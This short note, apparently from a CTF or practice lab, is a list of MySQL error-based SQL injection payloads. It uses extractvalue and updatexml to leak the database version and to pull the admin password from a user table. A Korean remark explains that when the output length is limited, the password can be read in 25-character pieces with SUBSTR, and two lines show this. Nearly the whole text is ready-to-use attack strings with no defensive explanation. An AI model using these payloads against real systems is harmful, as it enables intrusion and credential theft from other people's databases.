' UNION SELECT extractvalue(1,concat(0x3a,version()));--
' UNION SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid="admin")));--

' UNION SELECT updatexml(null,concat(0x3a,version()),null);--
' UNION SELECT updatexml(null,concat(0x3a,(SELECT upw FROM user WHERE uid="admin")),null);--

길이 제약이 있을 시 아래와 같이 잘라서 보는 것으로 응용
' UNION SELECT extractvalue(1,concat(0x3a,(SELECT SUBSTR(upw,1,25) FROM user WHERE uid="admin")));--
' UNION SELECT extractvalue(1,concat(0x3a,(SELECT SUBSTR(upw,26,25) FROM user WHERE uid="admin")));--
